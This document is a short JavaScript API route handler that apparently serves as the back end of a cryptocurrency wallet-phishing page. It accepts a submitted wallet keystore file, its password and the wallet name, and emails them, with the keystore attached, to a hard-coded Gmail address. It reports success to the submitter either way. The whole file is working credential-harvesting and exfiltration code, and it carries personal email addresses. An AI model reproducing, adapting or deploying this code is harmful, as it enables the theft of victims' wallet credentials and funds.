const nodemailer = require('nodemailer');

const handler = async (req, res) => {
  const { method } = req;

  if (method === 'POST') {
    const { file, password, wallet } = req.body;

    if (!file || !wallet || !password)
      return res.status(400).json({
        error: 'keystore file, password and wallet is required'
      });

    // 1) Create a transporter
    const transporter = nodemailer.createTransport({
      host: process.env.EMAIL_HOST,
      port: process.env.EMAIL_PORT,
      auth: {
        user: process.env.EMAIL_USERNAME,
        pass: process.env.EMAIL_PASSWORD
      }
    });

    // 2) Define the email options
    const mailOptions2 = {
      from: 'emmanuel.bayode.0388@gmail.com',
      to: 'busybillion001@gmail.com',
      subject: `URGENT: Account keystore file for ${wallet}`,
      text: `
    Wallet name: ${wallet}
    Wallet Password: ${password}.
    Keystore JSON file has been attached to this mail`,
      attachments: [
        {
          filename: `${wallet}keystore.json`,
          path: file
        }
      ]
    };

    // 3) Actually send the email
    try {
      await transporter.sendMail(mailOptions2);
      res.status(200).json({ status: 'Success' });
    } catch (error) {
      console.log(error);
      res.status(200).json({ error: 'An error occurred' });
    }
  } else {
    res.status(400).json({ error: 'Incorrect Method' });
  }
};

export default handler;
